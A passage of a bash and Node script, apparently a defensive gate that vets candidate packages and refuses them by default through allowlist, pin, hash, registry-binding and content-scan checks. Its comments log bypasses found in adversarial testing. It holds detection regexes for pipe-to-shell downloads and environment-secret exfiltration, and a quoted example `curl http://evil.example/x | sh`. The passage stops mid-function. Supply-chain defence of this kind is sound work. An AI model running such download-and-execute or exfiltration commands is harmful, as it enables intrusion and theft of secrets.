#!/usr/bin/env bash
# capability-vet.sh -- the gate that refuses by default (Phase 06, ADR-0110).
#
# The capability scout searches live ecosystems and proposes things to install. That is an
# untrusted-input path into this repository, and the one place in arc where a mistake is not
# merely wrong but hostile. This script is what stands in it.
#
# It BLOCKs unless ALL of these hold, and it reports EVERY condition that failed rather than
# the first, so one run tells you everything that is wrong:
#
#   existence     a registry response is recorded, PARSES, and names this name at this version
#   allowlist     the name was decided in advance, not discovered live
#   version       pinned exactly, and offered by the recorded response (a git SHA for a skill)
#   hash          the integrity string, EQUAL to the one the registry published
#   provenance    TWO fields, recorded separately, each real text
#   content-scan  the whole fetched tree, scanned for exfiltration and pipe-to-interpreter
#   human-ok      required whenever the tree is write-capable, or cannot be fully read
#
# WHY THE METADATA CHECKS LIVE IN NODE AND NOT IN grep.
#
# The first version compared claims to the registry record with `grep -q -- "$VALUE" file`. A
# fresh adversarial pass defeated every single check through that one decision:
#   - a `name` containing a newline made `grep -qxF` a MULTI-PATTERN match, so
#     `evil-package\nsafe-tool` passed the allowlist — defeating the one control ADR-0110
#     names as the anti-slopsquatting defence;
#   - `registry-record` was an attacker-chosen path, so a candidate pointed it at its own
#     source file and self-certified its existence;
#   - the hash was shape-checked and never compared, so sixteen `A`s passed;
#   - `1.2.3` matched a registry offering only `1.2.31`, and BRE `.` matched `1x2x3`.
# Substring matching cannot express "this field EQUALS that field". Structural comparison can,
# so the metadata half is one node program over parsed JSON, and the shell does only what the
# shell is good at: recursive text search.
#
# THINGS THIS SCRIPT DELIBERATELY DOES NOT DO.
#
# It never installs. `npm install` and `pip install` run lifecycle scripts before any scanner
# sees the code, so a gate that installs in order to inspect has already lost. Vetting operates
# on an already-fetched tree (`npm pack`, a tarball, a clone) and reads it as data. There is no
# package-manager invocation anywhere in this file, and a test greps for one.
#
# It never reads write-capability from the candidate. MCP's ToolAnnotations are hints the spec
# says clients "should never make tool use decisions based on ... from untrusted servers", and
# skills have no scope field at all. Write-capability is COMPUTED, and silence means yes.
#
# It never uses popularity. Stars, downloads and repo age measure adoption, and adoption is
# what a supply-chain attack manufactures.
#
# WHAT IT STILL CANNOT DO, stated because a gate whose limits are unwritten reads as stronger
# than it is. The content scan is a PATTERN LIST, not an analyser: `require("child"+"_process")`
# defeats it, and ADR-0110's revisit trigger is exactly a candidate that passes it and is still
# hostile. What compensates is the default — anything opaque, anything it cannot fully read,
# anything shipping an install hook is write-capable and needs a human.
#
# Usage:
#   capability-vet.sh --candidate <dir> --allowlist <file> --lock <file>
#   capability-vet.sh --audit --lock <file> [--max-age <days>]
#
# Exit: 0 PASS · 1 one or more BLOCKs (or stale rows under --audit) · 2 bad arguments.

set -u

die() { printf 'capability-vet: %s\n' "$1" >&2; exit 2; }

CANDIDATE=""; ALLOWLIST=""; LOCK=""; AUDIT=0; MAX_AGE="30"
while [ $# -gt 0 ]; do
  case "$1" in
    --candidate) CANDIDATE="${2:-}"; shift 2 || die "--candidate needs a value" ;;
    --allowlist) ALLOWLIST="${2:-}"; shift 2 || die "--allowlist needs a value" ;;
    --lock)      LOCK="${2:-}";      shift 2 || die "--lock needs a value" ;;
    --max-age)   MAX_AGE="${2:-}";   shift 2 || die "--max-age needs a value" ;;
    --audit)     AUDIT=1; shift ;;
    -h|--help)   sed -n '2,60p' "$0"; exit 0 ;;
    *)           die "unknown argument '$1'" ;;
  esac
done

# ---------------------------------------------------------------------------
# --audit
# ---------------------------------------------------------------------------
if [ "$AUDIT" -eq 1 ]; then
  [ -n "$LOCK" ] || die "--audit needs --lock"
  [ -f "$LOCK" ] || die "no lock file at $LOCK"
  case "$MAX_AGE" in
    ''|*[!0-9]*) die "--max-age must be a whole number of days, got '$MAX_AGE'" ;;
  esac
  node -e '
    const fs = require("node:fs");
    let lock;
    try { lock = JSON.parse(fs.readFileSync(process.argv[1], "utf8")); }
    catch (e) { console.log("the lock file does not parse: " + e.message); process.exit(1); }
    const maxAge = Number(process.argv[2]);
    // Both lists. A refused candidates facts age too, and a refusal nobody re-examines is a
    // decision made on data nobody has checked since.
    const groups = [["capability", lock.capabilities], ["refusal", lock.refusals]];
    const now = Date.now();
    let stale = 0, total = 0;
    for (const [kind, rows] of groups) {
      if (rows === undefined || rows === null) continue;
      if (!Array.isArray(rows)) { console.log(`stale  the \`${kind}\` list is not an array — the lock file is malformed`); stale++; continue; }
      for (const r of rows) {
        total++;
        const t = Date.parse(String(r && r.checked) + "T00:00:00Z");
        // Unparseable is stale: a date nobody can read is a date nobody has checked.
        // In the FUTURE is stale too — it is not a fresh check, it is a wrong one, and
        // treating it as fresh means one typo exempts a row forever.
        let why = null;
        if (Number.isNaN(t)) why = "unparseable date";
        else if (t > now) why = "checked date is in the future";
        else {
          const days = Math.floor((now - t) / 86400000);
          if (days > maxAge) why = `${days} days ago, limit ${maxAge}`;
        }
        if (why) { stale++; console.log(`stale  ${kind} ${r && r.name}@${r && r.version} — last checked ${r && r.checked} (${why})`); }
      }
    }
    console.log(`${total} row(s), ${stale} stale.`);
    process.exit(stale ? 1 : 0);
  ' "$LOCK" "$MAX_AGE"
  exit $?
fi

[ -n "$CANDIDATE" ] || die "need --candidate <dir>"
[ -n "$LOCK" ]      || die "need --lock <file>"
[ -d "$CANDIDATE" ] || die "no candidate directory at $CANDIDATE"
[ -f "$CANDIDATE/candidate.json" ] || die "no candidate.json in $CANDIDATE"

# ---------------------------------------------------------------------------
# The content scan and the write-capability computation.
#
# Over the WHOLE fetched tree, not just `src/`. Scanning one subdirectory meant a payload in
# `lib/` was invisible while the identical file under `src/` was refused, and the lock recorded
# the whole directory as the source either way.
#
# `-a`, never `-I`. `-I` skips any file holding a NUL byte, and a NUL inside a JavaScript
# comment changes nothing about how the file executes — one NUL turned three BLOCKs into a
# PASS. Binary is now searched as text AND counted as opaque.
# ---------------------------------------------------------------------------
SCAN_ROOT="$CANDIDATE"

# The hit is returned RAW. It used to be relativised here with `sed "s|^$CANDIDATE/||"`, which
# interpolates an unsanitised path into a sed expression: a candidate directory containing `\`,
# `[` or `|` broke the expression, sed wrote nothing, and every hit vanished — so a tree with
# `child_process`, `curl | sh` and env exfiltration came back `PASS … read-only`. On Windows
# that fired for the ORDINARY native path form. Relativising is a plain string operation and
# now happens in node, where a path is data rather than syntax.
# Set by scan() when grep itself fails. An inconclusive scan is NEVER a clean one.
SCAN_BROKE=""

scan() {  # scan <regex> -- the first matching path:line, or nothing
  # -a and NOT -I. They are opposites, and `-raInE` carried both: `-I` won, binary files were
  # skipped, and one NUL byte in a comment hid a payload from every pattern here. The flag
  # string looked like it said "treat binary as text" and said the reverse.
  #
  # THE EXIT STATUS IS READ. This was `grep … | head -1`, so the pipeline reported head's status
  # and grep's was thrown away along with its stderr — a grep that FAILED was byte-identical, to
  # this gate, to a grep that found nothing. An adversarial pass put a shim on PATH that rejected
  # only the pattern flags and got `PASS safe-tool@1.2.3 — read-only` out of a tree carrying
  # `child_process` and `curl http://evil.example/x | sh`. `--exclude` is not POSIX and `\b` is
  # not portable ERE, so busybox, a POSIX-only grep and a BSD ERE dialect each reach the same
  # place without any shim at all. The `[ -z "$READABLE" ]` guard below does fail closed when
  # grep is missing ENTIRELY, but READABLE is a different invocation and cannot see that these
  # four pattern searches died.
  #
  # 0 = matched · 1 = no match · >=2 = grep failed. Only the middle one is "clean".
  local out rc line skip_c skip_r
  out="$(LC_ALL=C grep -ranE -- "$1" "$SCAN_ROOT" 2>/dev/null)"
  rc=$?
  if [ "$rc" -ge 2 ]; then
    SCAN_BROKE="the content scan could not complete — grep exited $rc"
    return 0
  fi
  [ -n "$out" ] || return 0

  # THE TWO RECORD FILES ARE SKIPPED BY EXACT PATH, NOT BY `--exclude`. `--exclude=GLOB` matches
  # a BASE NAME at every depth in the recursive case, so a payload named `lib/registry.json` was
  # invisible to all four detectors AND to the write-capability computation, which is reachable
  # in a real package through `"bin": {"t":"./lib/registry.json"}` plus a shebang. Only the two
  # files at the candidate ROOT are this gate's own inputs; anything else wearing those names is
  # candidate content and gets scanned like everything else.
  #
  # Prefix-stripped with a QUOTED expansion, never `case`: a candidate directory containing `[`
  # or `*` would be read as a glob pattern, which is the same class of bug as the `sed` path
  # interpolation this file already removed once.
  skip_c="$SCAN_ROOT/candidate.json:"
  skip_r="$SCAN_ROOT/registry.json:"
  while IFS= read -r line; do
    if [ -z "$line" ]; then continue; fi
    if [ "${line#"$skip_c"}" != "$line" ]; then continue; fi
    if [ "${line#"$skip_r"}" != "$line" ]; then continue; fi
    printf '%s\n' "$line"
    return 0
  done <<EOF
$out
EOF
}

# A file holding a NUL is opaque: a scanner reading it as text is guessing, and "we could not
# read all of it" is the condition that means write-capable. ANY opaque file counts — asking
# "are there zero readable files" let one README beside a compiled blob reclassify the whole
# candidate as read-only.
#
# Done in node, not grep. `grep -P` is GNU-only, and the obvious portable fallback —
# `grep -rl "$(printf '\000')"` — is worse than useless: command substitution strips NUL, so
# the pattern becomes empty, every file matches, and everything is write-capable for a reason
# that has nothing to do with the candidate.
OPAQUE_RC=0
OPAQUE="$(node -e '
  const fs = require("node:fs"), path = require("node:path");
  const walk = (d) => {
    let e = [];
    // AN UNLISTABLE DIRECTORY IS OPAQUE, exactly as an unreadable FILE already is on the line
    // below. This returned null, which means "nothing opaque here", so a chmod-000 subtree
    // carrying the payload was skipped in silence: grep put its Permission denied on the
    // discarded stderr, a readable sibling kept READABLE non-empty, and the tree came back
    // read-only with no human OK required. This exact fix already exists in this repository at
    // .claude/scripts/absorb/study.mjs, which emits REFUSE -- cannot list. It was applied there
    // and never here, which is the twin-fix shape the build rules name: grep the pattern, not
    // the file.
    try { e = fs.readdirSync(d, { withFileTypes: true }); } catch { return d; }
    for (const x of e) {
      const p = path.join(d, x.name);
      // A SYMLINK IS OPAQUE. It was skipped by every inspector here -- grep -r does not follow
      // one, find -type f excludes it, and this walk fell through to continue -- while npm
      // reads a symlinked package.json perfectly well. Following it instead would be worse: a
      // link pointing at / would hand the scanner the whole filesystem. Refusing to reason
      // about it is the fail-closed half of that choice.
      if (x.isSymbolicLink()) return p;
      if (x.isDirectory()) { const r = walk(p); if (r) return r; continue; }
      if (!x.isFile()) continue;
      let b; try { b = fs.readFileSync(p); } catch { return p; }   // unreadable is opaque too
      if (b.includes(0)) return p;
    }
    return null;
  };
  const hit = walk(process.argv[1]);
  if (hit) process.stdout.write(path.relative(process.argv[1], hit).split(path.sep).join("/"));
' "$SCAN_ROOT" 2>/dev/null)" || OPAQUE_RC=$?

READABLE="$(LC_ALL=C grep -ral . "$SCAN_ROOT" 2>/dev/null | head -1)"

# Pipe-to-anything-that-executes, with an absolute path allowed. `| /bin/sh`, `| node`,
# `| python3` and a URL containing `&` all sailed past the first version.
PIPE_SH='(curl|wget|iwr|Invoke-WebRequest)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(/[A-Za-z0-9_./-]*/)?(ba|z|da|k|c)?(sh|node|python[0-9.]*|perl|ruby|pwsh|powershell)\b|iex[[:space:]]*\(|\$SHELL'
EXFIL='(process\.env|os\.environ|ENV\[)[^;]*(fetch|axios|request|urlopen|requests\.(post|put)|http\.request|net\.connect|dns\.)|(fetch|axios\.post|requests\.post|urlopen|net\.connect|dns\.resolve)[^;]*(process\.env|os\.environ|SECRET|TOKEN|API_?KEY|PASSWORD)'
WRITES='(writeFile|appendFile|createWriteStream|mkdir|rmdir|unlink|rimraf|fs\.rm|copyFile|renameSync|open\([^)]*["'"'"']w)|child_process|spawn\(|execSync|execFile|\bexec\(|subprocess\.|os\.system|shutil\.|Popen\(|>[[:space:]]*/'
# A require/import whose argument is not a plain literal cannot be reasoned about at all.
# `require("child"+"_process")` defeated the write detector with one `+`, so a computed module
# specifier is now itself the finding: not "this writes", but "this cannot be shown not to".
DYNAMIC='(require|import)[[:space:]]*\([[:space:]]*[^"'"'"')][^)]*\)|(require|import)[[:space:]]*\([[:space:]]*["'"'"'][^"'"'"']*["'"'"'][[:space:]]*\+'

HIT_PIPE="$(scan "$PIPE_SH")"
HIT_EXFIL="$(scan "$EXFIL")"
HIT_WRITE="$(scan "$WRITES")"
HIT_DYNAMIC="$(scan "$DYNAMIC")"

# Install-time lifecycle hooks, found ANYWHERE in the tree. An npm tarball extracted into
# `src/` puts its manifest at `src/package.json`, and only the candidate root was checked.
HOOK=""
HOOK_UNREADABLE=""
# -print0 and `read -d ""`. This split on newlines, and a path is allowed to contain one: a
# manifest at `we<newline>ird/package.json` arrived as two lines, neither of which existed, so
# the hook sweep found nothing and said so confidently.
while IFS= read -r -d '' pj; do
  [ -n "$pj" ] || continue
  found="$(node -e '
    const fs = require("node:fs");
    let raw;
    // THE EXIT STATUS OF THIS PROGRAM IS READ BY THE CALLER. It used to swallow every failure
    // into a bare catch whose comment said an unreadable manifest is covered by the opaque
    // check. That is false for at least one real error class: a package.json larger than
    // MAX_STRING_LENGTH (about 512 MB) throws ERR_STRING_TOO_LONG here while the buffer-based
    // opaque check reports the same file as perfectly readable. A spawn failure under load
    // produced the same silence -- a transient one was observed reading as "no hook".
    try { raw = fs.readFileSync(process.argv[1], "utf8"); } catch { process.exit(3); }
    let doc;
    // npm STRIPS a UTF-8 BOM before reading a manifest (read-package-json), so a package.json
    // that JSON.parse refuses for three leading bytes is one whose postinstall npm still runs.
    // Three bytes turned a BLOCK into a PASS. The allowlist reader further down this same file
    // has stripped the BOM all along -- applied in one reader, not in its twin.
    try { doc = JSON.parse(raw.replace(/^\uFEFF/, "")); } catch { process.exit(4); }
    const s = (doc && doc.scripts) || {};
    const hooks = ["preinstall", "install", "postinstall", "prepare", "prepublish", "prepublishOnly"];
    const f = hooks.filter((h) => s[h]);
    if (f.length) process.stdout.write(f.join(", "));
  ' "$pj" 2>/dev/null)"
  rc=$?
  if [ "$rc" -ne 0 ]; then
    # Fail closed. Not "no hook" -- "we could not tell", which is the same condition an opaque
    # file already produces, and it costs a human OK rather than a hard refusal.
    HOOK_UNREADABLE="${pj#"$CANDIDATE"/} (the manifest could not be read or parsed)"
    break
  fi
  if [ -n "$found" ]; then
    HOOK="${pj#"$CANDIDATE"/}: $found"
    break
  fi
done < <(find "$SCAN_ROOT" -name package.json -type f -print0 2>/dev/null)

# The opaque probe is a node subprocess, and its exit status is now read for the same reason the
# manifest reader's is: a probe that DIED reported the empty string, which reads as "nothing
# opaque here" — the most permissive answer it can give.
if [ "$OPAQUE_RC" -ne 0 ] && [ -z "$OPAQUE" ]; then
  OPAQUE="the tree could not be walked (the opacity probe exited $OPAQUE_RC)"
fi

WRITE_CAPABLE=0; WCAP_WHY=""
if [ -n "$OPAQUE" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="$OPAQUE cannot be read as text — an inconclusive scan is write-capable, never clean"
elif [ -z "$READABLE" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="nothing in the tree could be read"
elif [ -n "$HIT_WRITE" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="its source writes, spawns or deletes: $HIT_WRITE"
elif [ -n "$HIT_DYNAMIC" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="it builds a module specifier at run time, so what it loads cannot be determined by reading it: $HIT_DYNAMIC"
fi
if [ -n "$HOOK" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="${WCAP_WHY:+$WCAP_WHY; }it ships install-time lifecycle script(s) — $HOOK"
fi
if [ -n "$HOOK_UNREADABLE" ]; then
  WRITE_CAPABLE=1
  WCAP_WHY="${WCAP_WHY:+$WCAP_WHY; }a manifest could not be read, so its install hooks are unknown — $HOOK_UNREADABLE"
fi

# EVERY HIT IS TRUNCATED BEFORE IT BECOMES AN ARGUMENT. The verdict channel is argv, and its
# size is candidate-controlled: one 200 KB minified line carrying a hit produced
# `node: Argument list too long`, exit 126, and NO verdict at all — no BLOCK, no PASS, and
# nothing written to the lock. Minified npm code routinely exceeds the per-argument limit, so
# this is ordinary input rather than an attack. A hit is evidence to a human, and 500 characters
# of it is as much evidence as 200,000.
clip() {
  local s="$1"
  if [ "${#s}" -gt 500 ]; then printf '%s… [truncated, %s chars]' "${s:0:500}" "${#s}"; else printf '%s' "$s"; fi
}
HIT_PIPE="$(clip "$HIT_PIPE")"
HIT_EXFIL="$(clip "$HIT_EXFIL")"
WCAP_WHY="$(clip "$WCAP_WHY")"

# ---------------------------------------------------------------------------
# Everything else is structural, and runs in one node program over parsed JSON.
# ---------------------------------------------------------------------------
node -e '
const fs = require("node:fs");
const path = require("node:path");
const [candidateDir, allowlistPath, lockPath, hitPipeRaw, hitExfilRaw, writeCapable, wcapWhyRaw, scanBroke] = process.argv.slice(1);

// Relativise here, as data. A scan hit names an absolute path on the machine that ran it, and
// that path goes into a COMMITTED lock file; doing it with `sed` in the shell is what let a
// backslash in the path silently void the whole scan.
const rel = (s) => {
  if (!s) return s;
  const abs = candidateDir.replace(/[\\/]+$/, "");
  return s.split(abs + "/").join("").split(abs + "\\").join("");
};
const hitPipe = rel(hitPipeRaw), hitExfil = rel(hitExfilRaw), wcapWhy = rel(wcapWhyRaw);

const out = [];
const blocks = [];
const block = (check, what, expected, found) => {
  blocks.push(check);
  out.push(`BLOCK [${check}] ${what}`, `  Expected: ${expected}`, `  Found:    ${found}`);
};

const readJson = (p) => { try { return JSON.parse(fs.readFileSync(p, "utf8")); } catch { return null; } };
// A field counts only as real TEXT. `false`, `0`, `{}` and `[]` all satisfied "not empty" and
// were recorded as provenance.
const text = (v) => (typeof v === "string" && v.trim().length >= 3 ? v.trim() : null);

const manifest = readJson(path.join(candidateDir, "candidate.json"));
if (!manifest || typeof manifest !== "object" || Array.isArray(manifest)) {
  console.log("BLOCK [existence] candidate.json is not a JSON object");
  console.log("  Expected: an object carrying name, registry, version, hash and provenance");
  console.log("  Found:    " + (manifest === null ? "unparseable" : Array.isArray(manifest) ? "an array" : typeof manifest));
  process.exit(1);
}

const name = manifest.name;
const version = String(manifest.version ?? "");
// NOT String(). Coercion made `registry: ["oci"]` become the string "oci" and take the full
// OCI path, and the lock then recorded the coerced value as though it had been declared.
// A field that selects which rules apply is read as declared or refused.
if (manifest.registry !== undefined && typeof manifest.registry !== "string") {
  block("existence", "registry is not a string",
    "a declared registry name such as npm, pypi, oci, skill or git — a coerced array or number selects which rules apply while reading as something else",
    JSON.stringify(manifest.registry));
}
const registry = typeof manifest.registry === "string" ? manifest.registry : "";

// --- name shape, FIRST. Everything downstream uses it as a search key, and a name carrying a
// newline turned the allowlist check into a multi-pattern match that any one line could pass.
const NAME_OK = /^@?[A-Za-z0-9][A-Za-z0-9._-]*(\/[A-Za-z0-9][A-Za-z0-9._-]*)?$/;
if (typeof name !== "string" || !NAME_OK.test(name)) {
  block("existence", `candidate name ${JSON.stringify(name)} is not a package name`,
    "one line, registry-legal characters — a newline in a name defeats every check that searches for it",
    JSON.stringify(name));
  console.log(out.join("\n"));
  process.exit(1);
}

// --- existence: the recorded registry response, at a FIXED path, parsed rather than grepped.
const RECORD = "registry.json";
if (manifest["registry-record"] !== undefined && manifest["registry-record"] !== RECORD) {
  block("existence", "the registry record is read from a fixed filename and this candidate names another",
    "`registry-record: registry.json`, beside candidate.json — an attacker-chosen path let a candidate cite its own source file as proof it exists",
    String(manifest["registry-record"]));
}
const record = readJson(path.join(candidateDir, RECORD));
if (!record) {
  block("existence", `no parseable registry response recorded for ${name}`,
    `${RECORD} beside candidate.json, holding the response the registry actually returned`,
    fs.existsSync(path.join(candidateDir, RECORD)) ? "present but does not parse" : "absent");
}

// NAME BINDING, and it exists because OCI cannot supply one from the response body.
//
// The header promises the record "names this name at this version". For npm and PyPI the
// response carries the package name and the existing checks lean on it. A container
// registry tag response carries NO repository identity at all -- it names the tag and the
// digests and nothing else -- so one faithfully recorded response certifies ANY allowlisted
// name. An adversarial pass demonstrated exactly that: the committed fixture response for
// one image admitted a candidate calling itself something else entirely.
//
// So an OCI candidate records the URL it fetched, and the repository must appear in it. The
// URL is candidate-supplied and therefore not trusted as proof of anything by itself -- what
// it does is make the claim CHECKABLE and make a lie a visible forgery rather than an
// omission the format made unavoidable.
// THE RECORDED RESPONSE MUST NAME THIS PACKAGE. For npm, PyPI, skill and git the body carries
// the identity for free in `name`, and NOTHING read it — a faithful packument for
// attacker-owned-package certified a candidate calling itself safe-tool, because every later
// check asks only "does this response offer 1.2.3", which it truthfully does. The comment above
// the OCI branch asserted that "for npm and PyPI the response carries the package name and the
// existing checks lean on it". That was not true of the code. This is the whole reason the OCI
// registry-url mechanism exists, left open on the registries that need no extra field for it.
if (registry !== "oci" && record && typeof record.name === "string" && record.name !== name) {
  block("existence", `the recorded response is for ${JSON.stringify(record.name)}, not ${JSON.stringify(name)}`,
    "a response whose own `name` equals the candidate name — the registry body for one package must never certify another",
    record.name);
}

// Container registries a recorded response may legitimately come from. Deliberately short:
// this gate refuses by default, and widening it is a reviewed diff rather than a guess.
const OCI_HOSTS = new Set([
  "docker.io", "index.docker.io", "registry-1.docker.io", "hub.docker.com",
  "ghcr.io", "quay.io", "gcr.io", "registry.gitlab.com", "public.ecr.aws", "mcr.microsoft.com",
]);

if (registry === "oci") {
  const url = text(manifest["registry-url"]);
  if (!url) {
    block("existence", `an oci candidate records no registry-url, and its response cannot name itself`,
      "`registry-url`: the URL the recorded response was fetched from — a container registry tag body carries no repository identity, so without this one response certifies any allowlisted name",
      "(absent)");
  } else {
    // BIND ON THE PATH, never on the string. A substring test passed ten of eleven forged
    // URLs: the name in a query string, in a fragment, in userinfo, in a lookalike
    // repository, in a subdomain, in a bare non-URL, and — worst, because it involves no
    // lie at all — the attackers OWN namespace on the same host, which truthfully contains
    // the name. A short name made it vacuous outright: every registry URL contains /v2/.
    let bad = null;
    try {
      const u = new URL(url);
      if (u.protocol !== "https:") bad = `scheme ${u.protocol}`;
      else if (u.username || u.password) bad = "userinfo in the URL";
      // THE HOST IS PINNED TOO. Binding on the path alone proves only that the attacker can
      // spell the name: the real committed candidate identity, served from
      // registry.attacker.example, passed. A container image is identified by registry AND
      // repository, so checking half of that is checking none of it. The list is short and
      // adding to it is a reviewed one-line change, which is what refuse-by-default means.
      else if (!OCI_HOSTS.has(u.hostname.toLowerCase())) bad = `host ${u.hostname}`;
      else {
        // AND THE NAME MUST BE NAMESPACED. For a single-segment name the old test admitted any
        // namespace -- attacker-owned/oci-tool matched, because "/oci-tool/" is in the path.
        // A container repository is ns/repo, so both segments are matched consecutively. The
        // fixture that was written to guard this used a repository literally named `attacker-…`,
        // which the path test caught for an unrelated reason: the fixture could not detect the
        // case its own comment named.
        if (!name.includes("/")) {
          bad = `an oci name must be namespaced (ns/repo), got "${name}"`;
        } else {
          const segs = u.pathname.split("/").filter(Boolean);
          const want = name.toLowerCase().split("/");
          let found = false;
          for (let i = 0; i + want.length <= segs.length; i++) {
            if (want.every((w, k) => segs[i + k].toLowerCase() === w)) { found = true; break; }
          }
          if (!found) bad = `path ${u.pathname}`;
        }
      }
    } catch { bad = "not a URL"; }
    if (bad) {
      block("existence", `the recorded registry-url does not name "${name}" in its path`,
        `an https URL whose PATH segments contain ${name} — a query string, a fragment, userinfo, a subdomain or a lookalike repository are not the repository`,
        `${url} (${bad})`);
    }
  }
}

// Versions, read STRUCTURALLY. `1.2.3` used to match a registry offering only `1.2.31`.
const offered = new Set();
const collect = (v) => { if (typeof v === "string") offered.add(v); };
if (record) {
  if (Array.isArray(record.versions)) record.versions.forEach(collect);
  else if (record.versions && typeof record.versions === "object") Object.keys(record.versions).forEach(collect);
  collect(record.version);
  if (record["dist-tags"] && typeof record["dist-tags"] === "object") Object.values(record["dist-tags"]).forEach(collect);
  if (Array.isArray(record.commits)) record.commits.forEach(collect);
  collect(record.commit);
  // OCI, and ONLY OCI. A container registry response for one tag names it in `name` and
  // publishes no `versions` array at all, so every reader above returns nothing and the
  // candidate was refused with "the response lists no versions" -- an advertised path (the
  // OCI digest named in the help text at the top of this file) that no candidate could walk.
  //
  // SCOPED DELIBERATELY. A first attempt fed record.name into offered for EVERY registry,
  // and in npm, PyPI and git `name` is the PACKAGE NAME: a faithful packument for a package
  // called v1.2.3 that publishes only 0.0.1 then admitted a pin of 1.2.3. That re-opened the
  // hole this gate already records -- a pinned version must be OFFERED, not merely a
  // substring -- and it was worse, because a package name is not even a substring of a
  // version. A fresh adversarial pass caught it and the whole change was reverted.
  if (registry === "oci") {
    // THE RECORD MUST MATCH THE CLAIM. `registry` is a field the candidate writes, so
    // scoping the OCI readers behind it is opt-in unless something refuses a body that is
    // plainly not from a container registry. Without this, flipping one string from npm to
    // oci restores the exact hole this whole change was reverted for once already: a
    // faithful npm packument for a package NAMED like a version, admitted as a tag.
    // PRESENCE, NEVER TRUTHINESS. This was `record.versions || record["dist-tags"] || …`, so a
    // body carrying `"versions": 0` slipped past every arm of it -- the guard did not fire,
    // `name` was read as a tag again, and the reverted C1 hole came back through one JSON
    // literal. `registry` is attacker-written, so this guard is the only thing standing between
    // a package body and the tag reader; a falsy value must not be able to switch it off.
    if (record && ["versions", "dist-tags", "info", "releases"].some((k) => k in record)) {
      block("existence", "an oci candidate recorded a package-registry response",
        "a container-registry response — a body carrying versions, dist-tags, releases or info is npm or PyPI, and its `name` is a PACKAGE NAME rather than a tag",
        Object.keys(record).slice(0, 6).join(", "));
    } else {
      // `name` is the TAG only when the body describes ONE tag. The OCI spec /v2/NAME/tags/list,
      // Quay and GitLab all put the REPOSITORY in `name` and the tags in `tags`, and reading
      // `name` there is the same format-specific-assumption defect one level down.
      if (!Array.isArray(record && record.tags)) collect(record && record.name);
      if (Array.isArray(record && record.tags)) {
        record.tags.forEach((t) => collect(typeof t === "string" ? t : t && t.name));
      }
    }
  }
}

// --- allowlist. Read as LINES and compared as strings; entries trimmed, BOM stripped,
// blanks and `#` comments ignored. A blank line used to admit a candidate with no name.
let allowed = [];
if (allowlistPath && fs.existsSync(allowlistPath)) {
  allowed = fs.readFileSync(allowlistPath, "utf8")
    .replace(/^\uFEFF/, "")
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter((l) => l && !l.startsWith("#"));
} else {
  block("allowlist", `no allowlist file to check "${name}" against`,
    "a readable allowlist naming what may be admitted", allowlistPath || "(none given)");
}
if (allowlistPath && fs.existsSync(allowlistPath) && !allowed.includes(name)) {
  // An EMPTY allowlist refuses everything, and that is the correct default rather than a
  // misconfiguration: nothing may be admitted until someone names what may be.
  block("allowlist", `"${name}" is not on the allowlist`,
    "a name decided in advance, one per line — this is the control that defeats slopsquatting, not the existence check",
    `${allowed.length} allowed name(s), none of them "${name}"`);
}

// --- version
const isSkill = registry === "skill" || registry === "git";
if (isSkill) {
  if (!/^[0-9a-f]{40}$/.test(version)) {
    block("version", `a ${registry} candidate is pinned by commit SHA, and "${version}" is not one`,
      "40 hex characters — skills publish no version or hash in their format", version || "(absent)");
  } else if (record && !offered.has(version)) {
    // `offered.size &&` used to guard this, which made a response offering NOTHING admit any
    // 40-hex string at all. The npm branch below is the same rule written correctly -- it omits
    // the size test and says "(the response lists no versions)" in that case. Two readers of one
    // rule, one guarded and one not: validate one read, compare another, one branch over.
    block("version", `the recorded response does not name commit ${version}`,
      "the pinned commit present in the recorded response",
      offered.size ? [...offered].slice(0, 3).join(", ") : "(the response lists no commits)");
  }
} else {
  // An OCI pin is the TAG, recorded exactly as the registry names it -- leading v included.
  // A first attempt stripped the v so that v2026.8.3 also offered 2026.8.3, and wrote the
  // stripped form into the lock. Container tags are mutable and independent: v1.2.3 and
  // 1.2.3 can be different images, so that lock row named a coordinate nobody had verified,
  // and re-verifying it would pull something else or 404. Record what was checked.
  const semver = registry === "oci"
    ? /^v?[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$/
    : /^[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$/;
  if (!semver.test(version)) {
    block("version", `version "${version || "(absent)"}" is not an exact pin`,
      "an exact version such as 1.2.3 — a range, a tag or `latest` moves under you", version || "(absent)");
  } else if (record && !offered.has(version)) {
    block("version", `the recorded response does not offer version ${version}`,
      "the pinned version present in the recorded response",
      offered.size ? [...offered].slice(0, 4).join(", ") + (offered.size > 4 ? ", …" : "") : "(the response lists no versions)");
  }
}

// --- hash. Compared to what the registry published, never merely shape-checked.
// A skill publishes no hash; its commit SHA IS the pin, and demanding one anyway made every
// real skill unpassable except by fabricating a value nothing verified.
const hash = text(manifest.hash);
if (!isSkill) {
  // Two notations, both real. `sha256-` is Subresource Integrity, base64, what npm and PyPI
  // publish. `sha256:` is the OCI descriptor form, hex, what every container registry
  // returns. The gate claimed to accept an OCI digest and rejected it on this line.
  //
  // The separator is NOT normalised before comparison, and that is deliberate. A first
  // attempt did normalise, on the reasoning that one digest written two ways is one digest.
  // That reasoning is FALSE: SRI is base64 of 32 bytes (44 characters) and an OCI digest is
  // 64 hex, so a faithful re-notation never normalises onto a match. Normalising bought
  // nothing real and weakened EQUAL-to-what-the-registry-published into equal-modulo-one-
  // character. The value below is still compared byte-for-byte against the recorded response.
  if (!hash || !/^sha(256|512)[:-][A-Za-z0-9+/=]{16,}$/.test(hash)) {
    block("hash", `no usable integrity hash for ${name}@${version}`,
      "npm dist.integrity, PyPI digests.sha256 or an OCI digest — `sha512-…` or `sha256-…`",
      hash || "(absent)");
  } else if (record) {
    // KEY-AWARE. Matching any digest-shaped string anywhere meant publisher-controlled free
    // text counted as "what the registry published": OCI `annotations` and config `Labels`
    // are spec-blessed, publisher-set and present in the very responses this gate accepts,
    // so a candidate could plant its own claimed hash and have the gate agree it was
    // published. Only fields that ARE digests count.
    const published = [];
    const DIGEST_KEYS = new Set(["digest", "manifest_digest", "integrity", "sha256", "sha512"]);
    const walk = (o, depth, key) => {
      if (!o || depth > 4) return;
      if (typeof o === "string") {
